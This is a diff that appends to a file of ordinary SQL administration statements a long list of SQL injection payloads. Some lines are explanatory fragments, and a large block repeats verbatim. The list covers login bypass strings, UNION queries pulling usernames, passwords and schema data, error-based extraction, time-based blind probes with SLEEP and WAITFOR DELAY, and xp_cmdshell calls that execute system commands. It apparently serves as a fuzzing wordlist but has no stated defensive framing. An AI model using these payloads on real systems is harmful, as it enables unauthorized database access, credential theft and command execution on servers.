@@ -2180,3 +2180,335 @@ REVOKE DELETE ON Products FROM user13;
 CREATE USER 'product_manager' IDENTIFIED BY 'securepassword';
 ALTER USER 'product_manager' RENAME TO 'pm_user';
 BEGIN TRANSACTION; INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (2, 'Chang', 1, 1, 19.00, 17); COMMIT;
+''
+``
+""
+//
+\\
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/
++ addition, concatenate (or space in url)
+|| (double pipe) concatenate
+% wildcard attribute indicator
+@variable local variable
+@@variable global variable
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1
+' AND MID(VERSION(),1,1) = '5';
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+# Hash comment
+/* C-style comment
+-- - SQL comment
+;%00 Nullbyte
+` Backtick
+' OR 1=1--
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR '1'='1'-- -
+' OR '1'='1'/* 
+admin'--
+admin'#
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin") or 1=1
+admin") or 1=1--
+admin") or 1=1#
+admin") or 1=1/*
+admin') or 1=1
+admin') or 1=1--
+admin') or 1=1#
+admin') or 1=1/*
+admin' or 'a'='a
+admin' or 'a'='a'--
+admin' or 'a'='a'#
+admin' or 'a'='a'/*
+admin") or ("a"="a
+admin") or ("a"="a"--
+admin") or ("a"="a"#
+admin") or ("a"="a"/*
+admin') or ('a'='a
+admin') or ('a'='a'--
+admin') or ('a'='a'#
+admin') or ('a'='a'/*
+' or 1=1
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+" or 1=1
+" or 1=1--
+" or 1=1#
+" or 1=1/*
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+1' or '1'='1
+1' or '1'='1'--
+1' or '1'='1'#
+1' or '1'='1'/*
+1" or "1"="1
+1" or "1"="1"--
+1" or "1"="1"#
+1" or "1"="1"/*
+1 or 1=1
+1 or 1=1--
+1 or 1=1#
+1 or 1=1/*
+' OR '1'='1
+" OR "1"="1
+1 OR 1=1
+' OR 'x'='x
+" OR "x"="x
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT username, password FROM users--
+' OR 1=1 LIMIT 1--
+1 AND 1=1
+1 AND 1=0
+1 AND 1=1--
+1' AND '1'='1
+1 AND 1=(SELECT COUNT(*) FROM tablenames)
+1 AND 1=(SELECT COUNT(*) FROM tablenames)--
+'; WAITFOR DELAY '0:0:10'--
+1 WAITFOR DELAY '0:0:10'--
+1); WAITFOR DELAY '0:0:10'--
+1)); WAITFOR DELAY '0:0:10'--
+1'; WAITFOR DELAY '0:0:10'--
+1'); WAITFOR DELAY '0:0:10'--
+1')); WAITFOR DELAY '0:0:10'--
+1 AND SLEEP(5)
+1' AND SLEEP(5)
+1) AND SLEEP(5)
+1)) AND SLEEP(5)
+1')) AND SLEEP(5)
+'; EXEC xp_cmdshell('ping 10.10.10.10')--
+'; exec master..xp_cmdshell 'ping 10.10.10.10'--
+UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+UNION SELECT @@version--
+UNION SELECT @@servername, @@language--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1 AND 2>1
+1 AND 1>2
+1' AND 'one'='one
+1' AND 'one'='one'--
+1' AND 'one'='one'#
+1 UNION SELECT user()
+1 UNION SELECT system_user()
+1 UNION SELECT user FROM mysql.user
+1 UNION SELECT version()
+1 UNION SELECT database()
+1 UNION SELECT table_name FROM information_schema.tables
+1 AND ASCII(SUBSTRING((SELECT database()),1,1))=115
+1 AND 1=CONVERT(int,(SELECT @@version))
+1 AND 1=CAST((SELECT user) as signed)
+1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
+1 UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x
+1' AND SUBSTR(@@version,1,1) = '5'
+1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'
+1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'--
+1' AND MID(VERSION(),1,1) = '5';
+1' AND MID(VERSION(),1,1) > '4';
+1' AND LEFT(VERSION(),1) = '5';
+1' AND LEFT(VERSION(),1) > '4';
+1' AND SUBSTR(VERSION(),1,1) = '5';
+1' AND SUBSTRING(VERSION(),1,1) = '5';
+1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))
+1 AND UPDATEXML(1, CONCAT(0x5e24,(SELECT version()),0x5e24), 1)
+1 AND extractvalue(rand(),concat(0x3a,(SELECT version())))
+1 PROCEDURE ANALYSE()
+1' HAVING 1=1--
+1' GROUP BY columnnames HAVING 1=1--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'a'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'b'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+1) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1)) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1)))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1))))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1' OR '1'='1
+1" OR "1"="1
+1' OR '1'='1'--
+1" OR "1"="1"--
+1' OR '1'='1'#
+1" OR "1"="1"#
+1' OR '1'='1'/*
+1" OR "1"="1"/*
+1'OR 1=1--
+1"OR 1=1--
+1'OR 1=1#
+1"OR 1=1#
+1'OR 1=1/*
+1"OR 1=1/*
+1' UNION SELECT @@version--
+' OR '1'='1
+" OR "1"="1
+1 OR 1=1
+' OR 'x'='x
+" OR "x"="x
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1 UNION SELECT username, password FROM users--
+' OR 1=1 LIMIT 1--
+1 AND 1=1
+1 AND 1=0
+1 AND 1=1--
+1' AND '1'='1
+1 AND 1=(SELECT COUNT(*) FROM tablenames)
+1 AND 1=(SELECT COUNT(*) FROM tablenames)--
+'; WAITFOR DELAY '0:0:10'--
+1 WAITFOR DELAY '0:0:10'--
+1); WAITFOR DELAY '0:0:10'--
+1)); WAITFOR DELAY '0:0:10'--
+1'; WAITFOR DELAY '0:0:10'--
+1'); WAITFOR DELAY '0:0:10'--
+1')); WAITFOR DELAY '0:0:10'--
+1 AND SLEEP(5)
+1' AND SLEEP(5)
+1) AND SLEEP(5)
+1)) AND SLEEP(5)
+1')) AND SLEEP(5)
+'; EXEC xp_cmdshell('ping 10.10.10.10')--
+'; exec master..xp_cmdshell 'ping 10.10.10.10'--
+UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--
+UNION SELECT @@version--
+UNION SELECT @@servername, @@language--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1 AND 2>1
+1 AND 1>2
+1' AND 'one'='one
+1' AND 'one'='one'--
+1' AND 'one'='one'#
+1 UNION SELECT user()
+1 UNION SELECT system_user()
+1 UNION SELECT user FROM mysql.user
+1 UNION SELECT version()
+1 UNION SELECT database()
+1 UNION SELECT table_name FROM information_schema.tables
+1 AND ASCII(SUBSTRING((SELECT database()),1,1))=115
+1 AND 1=CONVERT(int,(SELECT @@version))
+1 AND 1=CAST((SELECT user) as signed)
+1 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
+1 UNION SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT user()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x
+1' AND SUBSTR(@@version,1,1) = '5'
+1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'
+1 AND SUBSTRING(@@version,1,INSTR(@@version,' '))='5.0.22-log'--
+1' AND MID(VERSION(),1,1) = '5';
+1' AND MID(VERSION(),1,1) > '4';
+1' AND LEFT(VERSION(),1) = '5';
+1' AND LEFT(VERSION(),1) > '4';
+1' AND SUBSTR(VERSION(),1,1) = '5';
+1' AND SUBSTRING(VERSION(),1,1) = '5';
+1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version())))
+1 AND UPDATEXML(1, CONCAT(0x5e24,(SELECT version()),0x5e24), 1)
+1 AND extractvalue(rand(),concat(0x3a,(SELECT version())))
+1 PROCEDURE ANALYSE()
+1' HAVING 1=1--
+1' GROUP BY columnnames HAVING 1=1--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > '.'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'a'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1' SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name > 'b'), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) a--
+1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+1) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1)) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1)))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1))))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1' OR '1'='1
+1" OR "1"="1
+1' OR '1'='1'--
+1" OR "1"="1"--
+1' OR '1'='1'#
+1" OR "1"="1"#
+1' OR '1'='1'/*
+1" OR "1"="1"/*
+1'OR 1=1--
+1"OR 1=1--
+1'OR 1=1#
+1"OR 1=1#
+1'OR 1=1/*
+1"OR 1=1/*
+1' UNION SELECT @@version--
+
